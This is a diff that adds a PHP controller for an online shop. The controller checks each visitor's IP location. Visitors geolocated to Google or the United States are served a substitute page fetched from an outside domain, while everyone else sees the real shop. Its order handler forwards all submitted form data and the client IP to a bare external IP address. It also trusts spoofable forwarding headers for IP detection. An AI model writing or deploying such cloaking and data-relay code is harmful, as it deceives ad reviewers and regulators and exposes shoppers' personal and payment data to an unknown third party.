@@ -1,0 +1,162 @@
+<?php
+/**
+ * Created by PhpStorm.
+ * User: Administrator
+ * Date: 2019/9/25
+ * Time: 18:18
+ */
+
+namespace app\front\controller;
+
+use think\Controller;
+use think\Db;
+
+class User extends Controller
+{
+    public function shop()
+    {
+        $verify = $this->ipVerify();
+        if($verify === true) {
+            return $this->fetch('shop');
+        } else {
+            $fh = fopen('https://slaxs.cn/keto.php', 'r');
+             if($fh){
+                while(!feof($fh)) {
+                    echo fgets($fh);die;
+                }
+            }
+        }
+    }
+    public function terms()
+    {
+        $verify = $this->ipVerify();
+        if($verify === true) {
+            return $this->fetch('terms');
+        } else {
+            $fh = fopen('https://slaxs.cn/keto.php', 'r');
+             if($fh){
+                while(!feof($fh)) {
+                    echo fgets($fh);die;
+                }
+            }
+        }
+    }
+    public function privacy()
+    {
+        $verify = $this->ipVerify();
+        if($verify === true) {
+            return $this->fetch('privacy');
+        } else {
+            $fh = fopen('https://slaxs.cn/keto.php', 'r');
+             if($fh){
+                while(!feof($fh)) {
+                    echo fgets($fh);die;
+                }
+            }
+        }
+    }
+    public function index()
+    {
+        $verify = $this->ipVerify();
+        if($verify === true) {
+            return $this->fetch('index');
+        } else {
+        	$fh = fopen('https://slaxs.cn/keto.php', 'r');
+             if($fh){
+                while(!feof($fh)) {
+                    echo fgets($fh);die;
+                }
+            }
+        }
+    }
+    public function ipVerify(){
+        vendor("ip2region-master.Ip2Region");
+        //$ip = real_ip();
+        $ip = get_client_ip_from_ns(true);
+        $ip_path = new \Ip2Region();
+        $info = $ip_path->btreeSearch($ip);
+        $guge = "谷歌";
+        $meiguo = "美国";
+        $google = "Google";
+        $america = "America";
+        $find_guge = stripos($info['region'], $guge);
+        $find_google = stripos($info['region'], $google);
+        $find_meiguo = stripos($info['region'], $meiguo);
+        $find_america = stripos($info['region'], $america);
+        if ($find_guge === false && $find_meiguo === false && $find_google === false && $find_america === false) {
+            return true;
+        } else {
+            return false;
+        }
+    }
+    public function add(){
+    	$verify = $this->ipVerify();
+        if($verify === false) {
+        	$fh = fopen('https://slaxs.cn/keto.php', 'r');
+            if($fh){
+                while(!feof($fh)) {
+                    echo fgets($fh);die;
+                }
+            }
+        }
+        header('Access-Control-Allow-Origin:*');
+        $data = $this->request->request();
+        $url = "http://54.187.192.81:8080/order.php";
+        $data['host'] = real_ip();
+        $data['createtime'] = date("Y-m-d H:i:s");
+        $data = post_curl($url, $data);
+        echo $data;die;
+    }
+}
+/*
+ * 函数功能: 获取客户端的真实IP地址
+ *
+ * 为什么要用这个函数?
+ * 因为我们线上Web服务器绝大部分都处于Netscaler(简称NS)后面，客户端访问的地址统一由NS调度
+ * 由NS调度的访问其实就是NS做了一层代理, 这期间就有一个问题, 因为真实的地址是内部IP请求的
+ * 当我们的应用去请获取 $_SERVER["REMOTE_ADDR"] 的时候, 得到的就是 NS 的内部 IP, 获取不了
+ * 真正的客户端 IP 地址.
+ *
+ * 当请求经过 NS 调度之后, NS 会把客户端的真实 IP 附加到 HTTP_CLIENT_IP 后，我们要提取的就
+ * 是这个地址.
+ *
+ * 如测试数据:
+ * [HTTP_CLIENT_IP] => 192.168.2.251, 192.168.3.252, 218.82.113.110
+ * 这条信息是我测试的结果, 前面两个 IP 是我伪造的, 最后那个 IP 才是我真实的地址.
+ *
+ * 同样我也测试过通过代理的数据
+ * [HTTP_X_FORWARDED_FOR] => 192.168.2.179, 123.45.67.78 64.191.50.54
+ * 前面两个IP是我伪造的, 最后面那个地址才是 proxy 的真实地址
+ *
+ * 提醒:
+ * HTTP_CLIENT_IP, HTTP_X_FORWARDED_FOR 都可以在客户端伪造, 不要轻易直接使用这两个值, 因为
+ * 恶意用户可以在里面输入PHP代码, 或者像伪造 N 个', 让你的程序执行有问题, 如果要直接使用这
+ * 两个值的时候最简单的应该判断一下长度(最长15位), 或用正则匹配一下是否是一个有效的IP地址
+ *
+ * 参数:
+ *
+ * @param string $proxy_override, [true|false], 是否优先获取从代理过来的地址
+ * @return string
+ *
+ */
+function get_client_ip_from_ns($proxy_override = false)
+{
+    if ($proxy_override) {
+        /* 优先从代理那获取地址或者 HTTP_CLIENT_IP 没有值 */
+        $ip = empty($_SERVER["HTTP_X_FORWARDED_FOR"]) ? (empty($_SERVER["HTTP_CLIENT_IP"]) ? NULL : $_SERVER["HTTP_CLIENT_IP"]) : $_SERVER["HTTP_X_FORWARDED_FOR"];
+    } else {
+        /* 取 HTTP_CLIENT_IP, 虽然这个值可以被伪造, 但被伪造之后 NS 会把客户端真实的 IP 附加在后面 */
+        $ip = empty($_SERVER["HTTP_CLIENT_IP"]) ? NULL : $_SERVER["HTTP_CLIENT_IP"];
+    }
+
+    if (empty($ip)) {
+        $ip = $_SERVER['REMOTE_ADDR'];
+    }
+
+    /* 真实的IP在以逗号分隔的最后一个, 当然如果没用代理, 没伪造IP, 就没有逗号分离的IP */
+    if ($p = strrpos($ip, ",")) {
+        $ip = substr($ip, $p+1);
+    }
+
+    return trim($ip);
+}
